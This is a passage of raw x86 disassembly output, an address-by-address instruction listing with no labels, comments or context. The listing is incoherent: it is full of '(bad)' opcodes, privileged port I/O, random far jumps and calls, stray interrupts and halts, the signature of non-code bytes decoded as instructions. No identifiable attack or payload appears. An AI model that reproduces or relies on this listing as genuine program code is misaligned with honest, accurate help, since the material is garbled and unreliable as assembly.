  420054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420055:	aam    0xa4
  420057:	loope  0x42008d
  420059:	pop    esp
  42005a:	fld    DWORD PTR [eax-0x122bb10f]
  420060:	xchg   ebx,eax
  420061:	xchg   bl,bl
  420063:	inc    BYTE PTR [edi+0x274439a6]
  420069:	int    0x9f
  42006b:	push   esi
  42006c:	aam    0x26
  42006e:	mov    eax,ds:0xc701dfdd
  420073:	sub    eax,DWORD PTR [ebp-0x5fc1c9c9]
  420079:	lods   al,BYTE PTR ds:[esi]
  42007a:	push   0x46
  42007c:	and    al,0x24
  42007e:	out    0x60,eax
  420080:	int    0x72
  420082:	mov    ecx,0x4834c9b1
  420087:	mov    edx,0x76782b18
  42008c:	enter  0x8bd7,0x3a
  420090:	push   ds
  420091:	outs   dx,DWORD PTR ds:[esi]
  420092:	(bad)  
  420093:	xor    eax,0x7413a363
  420098:	push   edi
  420099:	dec    ebx
  42009a:	nop
  42009b:	mov    esi,0xb7b37a2
  4200a0:	jg     0x4200d7
  4200a2:	cli    
  4200a3:	in     eax,0xc4
  4200a5:	fs jmp 0x631f:0xcde3c8d0
  4200ad:	inc    ebp
  4200ae:	mov    WORD PTR [edx-0x7a],?
  4200b1:	arpl   WORD PTR [eax-0xc7a1f75],bp
  4200b7:	jg     0x4200ee
  4200b9:	enter  0xcb7a,0xe4
  4200bd:	inc    esi
  4200be:	pop    ecx
  4200bf:	pop    esp
  4200c0:	mov    dh,0x65
  4200c2:	bound  edi,QWORD PTR [ecx+ebx*1-0x1e]
  4200c6:	sub    esi,DWORD PTR [esi+0x201480b8]
  4200cc:	push   ecx
  4200cd:	outs   dx,DWORD PTR ds:[esi]
  4200ce:	jnp    0x4200b7
  4200d0:	push   edx
  4200d1:	or     ecx,esi
  4200d3:	or     BYTE PTR [ebp-0x2b],cl
  4200d6:	pop    edx
  4200d7:	dec    esi
  4200d8:	addr16 ret 
  4200da:	pop    ebp
  4200db:	fdivp  st(7),st
  4200dd:	or     al,0xc8
  4200df:	jbe    0x4200da
  4200e1:	mov    ebp,0x56b3aae4
  4200e6:	pop    ecx
  4200e7:	ss ret 0x940a
  4200eb:	add    ah,BYTE PTR [edx]
  4200ed:	adc    eax,0x733e42ad
  4200f2:	ds push es
  4200f4:	adc    ebp,DWORD PTR [ebp-0x26]
  4200f7:	mov    ds:0x860d510e,eax
  4200fc:	call   0xc833:0xa47f957e
  420103:	into   
  420104:	push   edi
  420105:	(bad)  
  420106:	or     bh,BYTE PTR [ebx-0x634b79cb]
  42010c:	fldenv [esi]
  42010e:	rol    BYTE PTR [ebp+0x1f68f327],0xce
  420115:	into   
  420116:	push   ebp
  420117:	sub    ebx,DWORD PTR [edi+0x75575ca4]
  42011d:	in     eax,dx
  42011e:	gs adc bh,dl
  420121:	ins    DWORD PTR es:[edi],dx
  420122:	cs dec ebx
  420124:	xchg   ebx,eax
  420125:	inc    ebx
  420126:	fiadd  DWORD PTR [eax-0x4]
  420129:	fs in  eax,dx
  42012b:	pop    ecx
  42012c:	mov    al,0x6c
  42012e:	mov    al,ds:0x58cd8897
  420133:	mov    edx,0x235e7a8
  420138:	(bad)  
  420139:	cs std 
  42013b:	cmp    eax,0xbf838f8b
  420140:	adc    ecx,edx
  420142:	jl     0x4200ec
  420144:	ins    BYTE PTR es:[edi],dx
  420145:	mov    ah,0x9a
  420147:	popa   
  420148:	lds    esi,FWORD PTR [eax]
  42014a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42014b:	push   ecx
  42014c:	ror    BYTE PTR [edx-0x70],0x93
  420150:	push   ecx
  420151:	jno    0x420176
  420153:	mov    ah,0xf3
  420155:	data16 and al,0x62
  420158:	inc    ecx
  420159:	sar    DWORD PTR [esi],1
  42015b:	enter  0xc240,0x55
  42015f:	xchg   DWORD PTR [esi+0x67],esi
  420162:	ds push ss
  420164:	pop    esi
  420165:	mov    al,0xf
  420167:	adc    BYTE PTR [eax+edx*1],bh
  42016a:	and    BYTE PTR [eax-0x39ba59f1],0x69
  420171:	dec    esp
  420172:	out    dx,al
  420173:	or     eax,DWORD PTR [ebx+0x5d]
  420176:	xlat   BYTE PTR ds:[ebx]
  420177:	rol    DWORD PTR ds:[esi-0x5167326c],cl
  42017e:	sub    BYTE PTR [ebp-0x27],dh
  420181:	fild   DWORD PTR [ebp-0x34]
  420184:	xchg   edi,eax
  420185:	sbb    eax,0x70bbca4e
  42018a:	adc    DWORD PTR [edi-0x26],ebp
  42018d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42018e:	mov    esi,DWORD PTR [ecx]
  420190:	sbb    BYTE PTR [ebx+esi*4],al
  420193:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420194:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420195:	ret    0x59eb
  420198:	imul   ebx,DWORD PTR [ecx-0x5d9a3818],0xffffffb3
  42019f:	cmp    eax,0x25849ee9
  4201a4:	or     eax,DWORD PTR [eax-0x38dd63b4]
  4201aa:	lods   al,BYTE PTR ds:[esi]
  4201ab:	and    esp,DWORD PTR [edx]
  4201ad:	jge    0x42013a
  4201af:	js     0x420153
  4201b1:	jns    0x420196
  4201b3:	xchg   edi,eax
  4201b4:	mov    eax,0x9f16e836
  4201b9:	sub    eax,DWORD PTR [ecx+0x6e]
  4201bc:	push   eax
  4201bd:	xchg   ebp,eax
  4201be:	pop    esi
  4201bf:	sbb    al,0x40
  4201c1:	out    0x93,al
  4201c3:	jmp    0x767a:0x703b2788
  4201ca:	enter  0x26ca,0x9
  4201ce:	and    BYTE PTR [esp+ebx*8-0x62],bh
  4201d2:	and    DWORD PTR ds:0xdf11a3c3,ebx
  4201d8:	pop    esp
  4201d9:	popf   
  4201da:	lods   al,BYTE PTR ds:[esi]
  4201db:	push   ds
  4201dc:	jmp    0x4ea7:0x43b32a86
  4201e3:	jmp    0x1fbf4184
  4201e8:	(bad)  
  4201e9:	xor    eax,0xf60e9782
  4201ee:	or     edx,DWORD PTR [esi]
  4201f0:	into   
  4201f1:	stc    
  4201f2:	adc    al,0xf8
  4201f4:	gs mov ah,0x59
  4201f7:	adc    eax,0xe337ead6
  4201fc:	dec    ebp
  4201fd:	jbe    0x4201f1
  4201ff:	repz push cs
  420201:	or     eax,0xe16b4695
  420206:	mov    bl,0xa
  420208:	lock mov BYTE PTR [eax],dh
  42020b:	rcl    DWORD PTR [ecx-0x26fd1b16],1
  420211:	test   eax,0xffa72f80
  420216:	push   ecx
  420217:	cdq    
  420218:	inc    esi
  420219:	adc    al,0xe6
  42021b:	hlt    
  42021c:	pop    es
  42021d:	xlat   BYTE PTR ds:[ebx]
  42021e:	fisub  DWORD PTR [esi+0x47]
  420221:	inc    esi
  420222:	cmp    al,0x1
  420224:	scas   al,BYTE PTR es:[edi]
  420225:	icebp  
  420226:	pop    ss
  420227:	adc    BYTE PTR [ebx],bh
  420229:	pop    esp
  42022a:	pop    ebp
  42022b:	pushf  
  42022c:	jnp    0x420252
  42022e:	and    al,0xd5
  420230:	push   ebp
  420231:	scas   eax,DWORD PTR es:[edi]
  420232:	aam    0x1b
  420234:	jbe    0x42023f
  420236:	inc    eax
  420237:	mov    ah,0x5b
  420239:	or     dh,BYTE PTR [ebx-0x1f644ad7]
  42023f:	or     BYTE PTR [ebx],al
  420241:	sti    
  420242:	adc    DWORD PTR [ecx-0x554b088a],ebp
  420248:	and    BYTE PTR [ebp+0x73],bh
  42024b:	jg     0x420257
  42024d:	aad    0xc
  42024f:	xchg   esp,eax
  420250:	ins    DWORD PTR es:[edi],dx
  420251:	xchg   esi,eax
  420252:	retf   
  420253:	sar    BYTE PTR [esi+0xe],1
  420256:	push   ebx
  420257:	or     esp,edi
  420259:	sbb    BYTE PTR [eax-0x7d84089a],ch
  42025f:	pop    esp
  420260:	sub    esp,esp
  420262:	push   0xfffffff9
  420264:	dec    esp
  420265:	dec    esi
  420266:	sahf   
  420267:	in     al,dx
  420268:	cwde   
  420269:	mov    ds:0x9cb8c33d,al
  42026e:	out    dx,eax
  42026f:	aas    
  420270:	lea    edx,[ebx]
  420272:	leave  
  420273:	cmp    eax,ecx
  420275:	adc    DWORD PTR [esi+ecx*4],edx
  420278:	imul   ecx,DWORD PTR [edx],0x28
  42027b:	adc    dh,bl
  42027d:	dec    eax
  42027e:	jl     0x4202af
  420280:	int    0xac
  420282:	dec    esi
  420283:	push   ds
  420284:	cli    
  420285:	lahf   
  420286:	push   ss
  420287:	scas   eax,DWORD PTR es:[edi]
  420288:	fcomi  st,st(5)
  42028a:	jge    0x4202d2
  42028c:	inc    eax
  42028d:	arpl   di,sp
  42028f:	repnz cmp BYTE PTR [ebp-0x6],al
  420293:	or     DWORD PTR [ecx*8-0x15cb0ea8],eax
  42029a:	in     al,dx
  42029b:	sub    DWORD PTR [edi],0x7e789c0a
  4202a1:	cmp    eax,0x3f85f8c2
  4202a6:	cmp    eax,0x88d1bd84
  4202ab:	and    DWORD PTR [edx],edi
  4202ad:	into   
  4202ae:	ror    DWORD PTR [edi+0x5c],1
  4202b1:	pop    edx
  4202b2:	adc    DWORD PTR [esp-0x2fdad60c],edx
  4202b9:	out    dx,al
  4202ba:	xchg   esp,eax
  4202bb:	xchg   DWORD PTR [ebp+0x34],esi
  4202be:	mov    BYTE PTR [edx-0x1038033e],cl
  4202c4:	push   esi
  4202c5:	xor    al,0x90
  4202c7:	push   ebx
  4202c8:	inc    edi
  4202c9:	lock mov DWORD PTR [ebx+0x16cf70f4],ebp
  4202d0:	push   0xffffffa9
  4202d2:	mov    ebx,0xee27137
  4202d7:	mov    dl,0xfa
  4202d9:	push   eax
  4202da:	popf   
  4202db:	fcomp  DWORD PTR [esi]
  4202dd:	inc    ebp
  4202de:	pushf  
  4202df:	js     0x420338
  4202e1:	adc    BYTE PTR [edx+edx*1+0x50],ah
  4202e5:	jecxz  0x4202ed
  4202e7:	mov    dl,0x2b
  4202e9:	arpl   WORD PTR [ebx+0x6e482285],bp
  4202ef:	addr16 jbe 0x420274
  4202f2:	lods   al,BYTE PTR ds:[esi]
  4202f3:	retf   0x3661
  4202f6:	xor    bh,BYTE PTR ds:0x1e8cb88
  4202fc:	imul   ebp,DWORD PTR [ebx+0x18],0x7e999791
  420303:	jmp    ebx
  420305:	lea    esi,[edi+0x5a]
  420308:	addr16 push edx
  42030a:	leave  
  42030b:	sub    BYTE PTR ds:0x498dc4bd,cl
  420311:	rcr    dl,1
  420313:	xchg   ecx,eax
  420314:	data16 xor BYTE PTR [ebx-0x65],cl
  420318:	lock fbld TBYTE PTR [eax]
  42031b:	and    BYTE PTR [ecx+0x6201a6bc],ch
  420321:	(bad)  [ecx+0x18]
  420324:	das    
  420325:	or     al,0xe0
  420327:	fisttp DWORD PTR [edi]
  420329:	xchg   ebp,eax
  42032a:	les    edx,FWORD PTR [eax+esi*8-0x3f]
  42032e:	inc    eax
  42032f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420330:	(bad)  
  420332:	dec    esp
  420333:	jnp    0x4203a5
  420335:	jmp    0x31da178b
  42033a:	push   edi
  42033b:	test   ebx,esp
  42033d:	(bad)  
  42033e:	in     al,dx
  42033f:	pop    edi
  420340:	xor    al,bh
  420342:	or     BYTE PTR [edi],ah
  420344:	pop    ebp
  420345:	mov    eax,0xee10c178
  42034a:	push   ebp
  42034b:	cmp    al,0xb9
  42034d:	push   edi
  42034e:	cdq    
  42034f:	test   eax,0xb8a994c0
  420354:	pop    esi
  420355:	and    DWORD PTR [esi+0x68f5ac16],ecx
  42035b:	cs jmp 0x3ae1:0xf12f5670
  420363:	jmp    FWORD PTR [esi]
  420365:	mov    cl,0x34
  420367:	cmp    BYTE PTR [eax],ah
  420369:	mov    esp,0x8427565c
  42036e:	jnp    0x420368
  420370:	sub    bl,BYTE PTR [edi+0x16fa0971]
  420376:	in     al,0xa5
  420378:	pop    ecx
  420379:	mov    ebp,0xd80ed90c
  42037e:	sub    esi,DWORD PTR [eax+0x3acc5f2d]
  420384:	outs   dx,BYTE PTR ds:[esi]
  420385:	clc    
  420386:	adc    DWORD PTR [ebp-0x5c4911c2],ebp
  42038c:	les    eax,FWORD PTR [edi-0x359ab98]
  420392:	das    
  420393:	push   esi
  420394:	mov    dh,0xf5
  420396:	dec    edx
  420397:	jl     0x4203ef
  420399:	jle    0x42033d
  42039b:	and    al,0x58
  42039d:	mov    bl,0xdb
  42039f:	ins    DWORD PTR es:[edi],dx
  4203a0:	fcmovbe st,st(6)
  4203a2:	mov    dh,BYTE PTR [esi+ecx*8]
  4203a5:	aam    0x11
  4203a7:	jmp    0x93b2a08c
  4203ac:	mov    dh,BYTE PTR [ebx-0x3105981]
  4203b2:	jno    0x42039c
  4203b4:	dec    esi
  4203b5:	imul   ecx,edi,0x23
  4203b8:	imul   esi,DWORD PTR [eax+esi*4-0x1eb5ca09],0x4c
  4203c0:	cwde   
  4203c1:	mov    ch,0x29
  4203c3:	sahf   
  4203c4:	add    BYTE PTR [edx+0x60],0x3c
  4203c8:	pop    edx
  4203c9:	mov    ?,WORD PTR [ecx]
  4203cb:	pop    esp
  4203cc:	gs add dh,bh
  4203cf:	or     edx,DWORD PTR [ecx+0x7e88ed03]
  4203d5:	iret   
  4203d6:	push   cs
  4203d7:	mov    ds:0xb2e03ac4,al
  4203dc:	xchg   esi,eax
  4203dd:	mov    BYTE PTR [edx+0x58699cc1],al
  4203e3:	test   eax,0xd89ed785
  4203e8:	int    0x15
  4203ea:	mov    cs,ebx
  4203ec:	push   esp
  4203ed:	cmp    eax,0x1d9d0540
  4203f2:	fdiv   DWORD PTR [edi+0xe6be18b]
  4203f8:	mov    bl,0xbc
  4203fa:	mov    DWORD PTR [esp+edi*1+0xe],edx
  4203fe:	repz xchg ebx,eax
  420400:	xor    BYTE PTR [edx+0x40],cl
  420403:	shl    DWORD PTR [eax+0x3a],0xcd
  420407:	xchg   edi,eax
  420408:	cs hlt 
  42040a:	leave  
  42040b:	add    bl,0xff
  42040e:	fisttp QWORD PTR [ecx+0x3c]
  420411:	leave  
  420412:	mov    WORD PTR [ebp+0x32bdfa36],cs
  420418:	fstp   DWORD PTR [edx-0x3fbae8c]
  42041e:	fwait
  42041f:	rol    BYTE PTR [esi],cl
  420421:	pop    ebx
  420422:	xchg   edx,eax
  420423:	cli    
  420424:	xchg   esp,eax
  420425:	sbb    esp,DWORD PTR [eax+eiz*8]
  420428:	adc    bh,ch
  42042a:	fnsave [ebx+eiz*8-0x17d916e1]
  420431:	lds    ebx,FWORD PTR [eax]
  420433:	out    dx,eax
  420434:	enter  0x51e3,0x55
  420438:	push   eax
  420439:	stos   BYTE PTR es:[edi],al
  42043a:	(bad)  
  42043b:	lods   al,BYTE PTR ds:[esi]
  42043c:	retf   
  42043d:	push   0xfffffff7
  42043f:	(bad)  
  420440:	fcom   DWORD PTR [edx]
  420442:	lock sbb al,0xf6
  420445:	mov    BYTE PTR [edx-0x7f3e90e1],bl
  42044b:	enter  0x9b67,0x5c
  42044f:	xchg   esp,eax
  420450:	jno    0x42042c
  420452:	pop    ecx
  420453:	cmp    eax,0xd734b0de
  420458:	aaa    
  420459:	fcomp  DWORD PTR [ecx]
  42045b:	xor    bl,ch
  42045d:	(bad)  
  42045e:	cmp    esi,DWORD PTR [ebx-0x34]
  420461:	lock (bad) 
  420463:	jbe    0x4203ee
  420465:	xchg   BYTE PTR [edx+ecx*1-0x12],cl
  420469:	fisub  WORD PTR [esi-0x3d]
  42046c:	pop    edx
  42046d:	aam    0xbd
  42046f:	aas    
  420470:	jno    0x420463
  420472:	push   ds
  420473:	cdq    
  420474:	pop    ecx
  420475:	pop    ebx
  420476:	inc    ebp
  420477:	scas   eax,DWORD PTR es:[edi]
  420478:	rcl    BYTE PTR [ebx-0x369aa35c],1
  42047e:	fnstsw WORD PTR [ebx-0x5b]
  420481:	pop    ds
  420482:	and    eax,0x30535f64
  420487:	xchg   ebp,eax
  420488:	mov    gs,ecx
  42048a:	adc    BYTE PTR [edx-0x2205c4c5],bh
  420490:	imul   eax,esp,0x96657d6c
  420496:	adc    eax,0xaa15621c
  42049b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42049c:	jnp    0x420438
  42049e:	pop    ebp
  42049f:	(bad)  
  4204a0:	dec    ebx
  4204a1:	mov    cl,0x33
  4204a3:	mov    bh,al
  4204a5:	xchg   esp,eax
  4204a6:	mov    ebp,DWORD PTR [ebx+0x5e]
  4204a9:	fidiv  DWORD PTR [esi-0x4984d579]
  4204af:	gs jmp 0xcfbfeb36
  4204b5:	add    edi,ebx
  4204b7:	scas   al,BYTE PTR es:[edi]
  4204b8:	xchg   edx,eax
  4204b9:	(bad)  [edx-0x44]
  4204bc:	rol    BYTE PTR [ebp+eax*8+0x5e698d19],1
  4204c3:	lds    edi,FWORD PTR [edi]
  4204c5:	mov    ah,0xda
  4204c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204c8:	cs adc eax,ecx
  4204cb:	and    eax,0x231bf30b
  4204d0:	lock adc BYTE PTR [ebx-0x2f],dh
  4204d4:	lods   eax,DWORD PTR ds:[esi]
  4204d5:	rol    BYTE PTR [edi+0x6d],cl
  4204d8:	mov    dl,0x63
  4204da:	sub    DWORD PTR [eax+0x38],ebp
  4204dd:	lods   al,BYTE PTR ds:[esi]
  4204de:	mov    ds:0x8442335c,eax
  4204e3:	xchg   dl,bh
  4204e5:	jne    0x4204c2
  4204e7:	adc    ecx,ecx
  4204e9:	icebp  
  4204ea:	pop    edi
  4204eb:	rcr    edx,cl
  4204ed:	pop    es
  4204ee:	hlt    
  4204ef:	sub    dl,ch
  4204f1:	push   0x3f593d6b
  4204f6:	push   ds
  4204f7:	mov    ebx,0xb4fa966b
  4204fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204fd:	int    0xbb
  4204ff:	cmp    eax,0x62674a5e
  420504:	jmp    0x240d902a
  420509:	fdivr  st(2),st
  42050b:	stos   DWORD PTR es:[edi],eax
  42050c:	mov    ecx,0x1389bb09
  420511:	(bad)  
  420512:	cmp    ch,ah
  420514:	inc    edi
  420515:	fcomp  DWORD PTR [ebx+eax*8+0x615c9b27]
  42051c:	push   esp
  42051d:	adc    al,0xad
  42051f:	outs   dx,DWORD PTR ds:[esi]
  420520:	adc    bh,BYTE PTR [ebx-0x6f]
  420523:	xor    DWORD PTR [ebx],0xae0760d3
  420529:	(bad)  
  42052a:	ins    DWORD PTR es:[edi],dx
  42052b:	and    ecx,edi
  42052d:	dec    eax
  42052e:	cmp    DWORD PTR ss:[ecx+ebx*1-0x13bce883],ebx
  420536:	sub    esp,DWORD PTR [ebp-0x4b]
  420539:	or     al,0xf0
  42053b:	hlt    
  42053c:	sub    al,0x6f
  42053e:	cmp    edx,esi
  420540:	and    dl,ah
  420542:	xchg   esi,eax
  420543:	adc    al,0x1b
  420545:	dec    edi
  420546:	repnz nop
  420548:	je     0x4204e9
  42054a:	xchg   esp,eax
  42054b:	xchg   ah,dl
  42054d:	outs   dx,DWORD PTR ds:[esi]
  42054e:	loope  0x4204d6
  420550:	(bad)  
  420551:	push   ss
  420552:	push   esp
  420553:	adc    bh,dh
  420555:	ud0    edi,DWORD PTR [ebp+0x610c19d6]
  42055c:	adc    eax,0xb77a3b2d
  420561:	inc    esp
  420562:	sbb    eax,0xf0c68fe8
  420567:	mov    bh,0x9d
  420569:	sbb    al,0x37
  42056b:	or     esp,DWORD PTR [edi-0x11]
  42056e:	rcl    edi,1
  420570:	xor    BYTE PTR ds:0xaaf3f231,ch
  420576:	inc    edi
  420577:	cwde   
  420578:	adc    ebp,DWORD PTR [edx]
  42057a:	mov    al,0x3c
  42057c:	add    dl,dl
  42057e:	add    DWORD PTR [edx-0x4a],ecx
  420581:	push   es
  420582:	retf   0xb26
  420585:	pop    esi
  420586:	jl     0x42053b
  420588:	mov    BYTE PTR [edx-0x28],0xa3
  42058c:	or     al,0x18
  42058e:	loopne 0x420558
  420590:	int    0xe6
  420592:	sub    ecx,DWORD PTR [ecx-0x57]
  420595:	stos   BYTE PTR es:[edi],al
  420596:	cmp    bl,dh
  420598:	jmp    0x2f2e0c34
  42059d:	push   edi
  42059e:	inc    esi
  42059f:	adc    ecx,DWORD PTR [edx+0x10]
  4205a2:	xor    DWORD PTR [edi],ebx
  4205a4:	adc    cl,dl
  4205a6:	mov    bh,ah
  4205a8:	and    BYTE PTR [ecx],dl
  4205aa:	sbb    edi,edi
  4205ac:	icebp  
  4205ad:	out    dx,al
  4205ae:	or     eax,0xe738896d
  4205b3:	in     al,0x49
  4205b5:	je     0x42061a
  4205b7:	inc    ebp
  4205b8:	jno    0x4205ef
  4205ba:	push   edx
  4205bb:	xor    cl,BYTE PTR [edx+0x52628419]
  4205c1:	mov    ecx,0xbea80fad
  4205c6:	jae    0x4205cd
  4205c8:	ficom  DWORD PTR [ecx]
  4205ca:	add    esp,0xffffffe0
  4205cd:	inc    esp
  4205ce:	push   0xffffff8c
  4205d0:	jae    0x4205ce
  4205d2:	scas   al,BYTE PTR es:[edi]
  4205d3:	pushf  
  4205d4:	stc    
  4205d5:	lahf   
  4205d6:	xchg   edx,eax
  4205d7:	mov    ebx,0x23ea4b78
  4205dc:	and    eax,0x147906f4
  4205e1:	pop    ss
  4205e2:	mov    cl,0x64
  4205e4:	inc    eax
  4205e5:	stos   DWORD PTR es:[edi],eax
  4205e6:	loopne 0x4205bc
  4205e8:	add    DWORD PTR [edx+0x40950d6e],0xffffffc2
  4205ef:	pop    eax
  4205f0:	jmp    0x2995:0xddad1e93
  4205f7:	data16 and BYTE PTR [edx+0x24a76693],0xf6
  4205ff:	dec    ecx
  420600:	sub    bh,BYTE PTR [ebx]
  420602:	cs pop ecx
  420604:	daa    
  420605:	push   ebp
  420606:	mov    ah,0x9b
  420608:	sbb    al,0x98
  42060a:	outs   dx,BYTE PTR ds:[esi]
  42060c:	cmp    cl,cl
  42060e:	inc    eax
  42060f:	jmp    0x91c91c52
  420614:	in     eax,0xaf
  420616:	jge    0x42059c
  420618:	into   
  420619:	push   edx
  42061a:	sub    ah,BYTE PTR [eax-0x39]
  42061d:	push   ebp
  42061e:	mov    ah,0x9b
  420620:	sahf   
  420621:	cmp    bh,dl
  420623:	cmp    DWORD PTR [ecx-0x5bf42e9b],ebp
  420629:	lds    edx,FWORD PTR [ecx+0x3390f2f9]
  42062f:	inc    esp
  420630:	inc    ecx
  420631:	mov    dh,ah
  420633:	fsubr  QWORD PTR [ebx+edx*2-0xd09c8f7]
  42063a:	or     eax,0xe77339f3
  42063f:	fcmovnb st,st(7)
  420641:	mov    ebx,0xe88a4e9b
  420646:	inc    esi
  420647:	test   BYTE PTR [edi+0x4d4c9fb0],dh
  42064d:	int    0x1b
  42064f:	and    al,0xab
  420652:	fwait
  420653:	clc    
  420654:	mov    ebp,0xf5652eb6
  420659:	mov    dl,0xde
  42065b:	push   edi
  42065c:	jo     0x4205e2
  42065e:	mov    ecx,0xefe64839
  420663:	stos   BYTE PTR es:[edi],al
  420664:	or     ch,BYTE PTR [ebp-0x3d]
  420667:	jns    0x4206a9
  420669:	xlat   BYTE PTR ds:[ebx]
  42066a:	cld    
  42066b:	in     eax,0xca
  42066d:	clc    
  42066e:	xchg   esp,eax
  42066f:	fst    DWORD PTR [edi+0x4f]
  420672:	aas    
  420673:	mov    eax,0x1fb360f6
  420678:	cmp    BYTE PTR [eax+0x5bfc7472],cl
  42067e:	pop    ebp
  42067f:	mov    WORD PTR [ecx],es
  420681:	adc    DWORD PTR [esi+0x604ae70a],edi
  420687:	and    eax,0xc5f4e905
  42068c:	lock mov dl,0x6d
  42068f:	loope  0x420632
  420691:	ficom  DWORD PTR [esi]
  420693:	pop    es
  420694:	ins    DWORD PTR es:[edi],dx
  420695:	inc    esi
  420696:	iret   
  420697:	push   edx
  420698:	push   0x8
  42069a:	cli    
  42069b:	push   esp
  42069c:	inc    edx
  42069d:	out    dx,al
  42069e:	cmp    bh,ah
  4206a0:	and    bl,BYTE PTR [esi-0x30]
  4206a3:	mov    ch,BYTE PTR [ebp-0x61]
  4206a6:	jg     0x42070e
  4206a8:	add    esi,DWORD PTR ds:[eax+eax*1+0x19257ec7]
  4206b0:	neg    DWORD PTR [ecx+0x69]
  4206b3:	or     bx,WORD PTR [edx]
  4206b6:	xchg   BYTE PTR [edx+0x4a],ah
  4206b9:	mov    esi,0x67f122f1
  4206be:	pop    ebx
  4206bf:	jno    0x42068e
  4206c1:	mov    ?,WORD PTR [eax-0x6e09e325]
  4206c7:	nop
  4206c8:	dec    DWORD PTR [edi]
  4206ca:	mov    eax,0xab594669
  4206cf:	ret    
  4206d0:	or     dh,dh
  4206d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206d3:	iret   
  4206d4:	inc    esi
  4206d5:	inc    ebp
  4206d6:	outs   dx,BYTE PTR ds:[esi]
  4206d7:	mov    bl,0x49
  4206d9:	mov    WORD PTR [ebp-0x55],gs
  4206dc:	jb     0x4206c5
  4206de:	push   0x7b
  4206e0:	xchg   edi,eax
  4206e1:	jp     0x420711
  4206e3:	mov    eax,DWORD PTR [ebx]
  4206e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206e6:	xchg   esi,eax
  4206e7:	in     al,dx
  4206e8:	gs push ecx
  4206ea:	or     bh,BYTE PTR [edx]
  4206ec:	mov    dl,0xec
  4206ee:	xchg   DWORD PTR [edi-0x4550ef2],eax
  4206f4:	xor    ebp,DWORD PTR [esi+0x575a4cec]
  4206fa:	push   edi
  4206fb:	mov    dl,0x99
  4206fd:	repz xchg ebp,eax
  4206ff:	lock test ch,bh
  420702:	or     eax,0xbad03c9b
  420707:	loope  0x4206af
  420709:	in     al,0xcc
  42070b:	xor    edx,0x1009e9e6
  420711:	jns    0x4206ba
  420713:	dec    eax
  420714:	lgs    edi,FWORD PTR [edx]
  420717:	aas    
  420718:	add    ah,ch
  42071a:	mov    ah,0xc9
  42071c:	test   dl,ch
  42071e:	fadd   DWORD PTR [edx+0x7d7b1f47]
  420724:	ret    0x6723
  420727:	dec    esp
  420728:	push   ebp
  420729:	mov    ds:0x154a611,al
  42072e:	hlt    
  42072f:	data16 (bad) 
  420731:	ins    BYTE PTR es:[edi],dx
  420732:	xchg   DWORD PTR [eax],ebp
  420734:	cs adc al,0xc8
  420737:	mov    dh,al
  420739:	cmp    DWORD PTR [edx+0x63],eax
  42073c:	iret   
  42073d:	nop
  42073e:	xchg   esi,eax
  42073f:	and    al,0x93
  420741:	inc    esp
  420742:	ficom  DWORD PTR [ebp+eax*2-0x6]
  420746:	rcl    DWORD PTR [edi],0x52
  420749:	inc    ebp
  42074a:	jo     0x420723
  42074c:	mov    bh,0xc
  42074e:	mov    ebp,0x16f06961
  420753:	ret    
  420754:	jno    0x4206fa
  420756:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420757:	and    al,0x1e
  420759:	jle    0x4207c2
  42075b:	lods   al,BYTE PTR ds:[esi]
  42075c:	fild   QWORD PTR [esi+ebp*2-0x41]
  420760:	aaa    
  420761:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420762:	fldcw  WORD PTR [edx-0x26]
  420765:	pop    es
  420766:	inc    esi
  420767:	sahf   
  420768:	inc    edx
  420769:	aaa    
  42076a:	inc    eax
  42076b:	mov    al,0x95
  42076d:	pop    ecx
  42076e:	inc    eax
  42076f:	fnstcw WORD PTR [esi]
  420771:	fmul   QWORD PTR [ebp+0x10]
  420774:	pop    ecx
  420775:	mov    edx,ebp
  420777:	idiv   cl
  420779:	jmp    0x2bf3:0x3bda39c2
  420780:	call   0x27a8927c
  420785:	push   ebp
  420786:	adc    al,0xf4
  420788:	repnz aam 0x9a
  42078b:	xor    al,0xb8
  42078d:	inc    al
  42078f:	aam    0x18
  420791:	clc    
  420792:	jge    0x420787
  420794:	ins    DWORD PTR es:[edi],dx
  420795:	shr    DWORD PTR [ebx],1
  420797:	xchg   al,dl
  420799:	xchg   edx,eax
  42079a:	fstp   st(5)
  42079c:	cmp    ah,BYTE PTR [ebx+edx*2-0x3d854c11]
  4207a3:	cld    
  4207a4:	addr16 (bad) 
  4207a7:	in     al,dx
  4207a8:	dec    ebx
  4207a9:	out    0x4b,al
  4207ab:	add    al,0x7d
  4207ad:	repnz int3 
  4207af:	adc    eax,0x5559d473
  4207b4:	add    al,0x32
  4207b6:	adc    dh,BYTE PTR [ebx]
  4207b8:	inc    edx
  4207b9:	fs xchg ebp,eax
  4207bb:	push   0x7ef5c42d
  4207c0:	stos   BYTE PTR es:[edi],al
  4207c1:	add    eax,DWORD PTR [eax-0x1f68d0d]
  4207c7:	repz mov eax,ds:0x17f1fa8e
  4207cd:	or     eax,0x24f524d1
  4207d2:	pop    edi
  4207d3:	xor    ch,0x24
  4207d6:	and    cl,BYTE PTR [ecx+0x464b6eb9]
  4207dc:	or     DWORD PTR [edi+0xe],esp
  4207df:	pushf  
  4207e0:	push   esp
  4207e1:	imul   ecx,DWORD PTR [ecx+ebp*2-0x23b7860b],0x509fbf01
  4207ec:	dec    esi
  4207ed:	or     DWORD PTR [esi+0x46],esi
  4207f0:	bound  esp,QWORD PTR [ecx]
  4207f2:	sbb    eax,0x74be2149
  4207f7:	or     eax,DWORD PTR [edi+ebp*1+0x74]
  4207fb:	sub    edx,DWORD PTR [eax]
  4207fd:	xchg   edi,eax
  4207fe:	cwde   
  4207ff:	clc    
  420800:	popf   
  420801:	ins    DWORD PTR es:[edi],dx
  420802:	loop   0x420848
  420804:	stc    
  420805:	in     al,dx
  420806:	call   0x9a93cfad
  42080b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
